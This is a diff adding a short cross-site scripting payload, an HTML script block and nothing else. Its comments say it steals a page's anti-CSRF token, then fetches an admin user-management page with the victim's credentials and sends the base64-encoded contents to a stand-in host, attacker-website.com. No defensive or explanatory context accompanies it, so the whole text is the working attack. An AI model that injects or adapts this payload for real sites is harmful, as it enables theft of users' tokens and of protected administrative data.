@@ -1,0 +1,8 @@
+<script>
+// Steal the anti-CSRF token from the page or a protected form
+let token = document.querySelector('meta[name="csrf-token"]').content;
+// OR, fetch a sensitive page and exfiltrate its contents
+fetch('/admin/user-management', {credentials: 'include'})
+  .then(response => response.text())
+  .then(data => fetch('https://attacker-website.com/exfil?data=' + btoa(data)));
+</script>
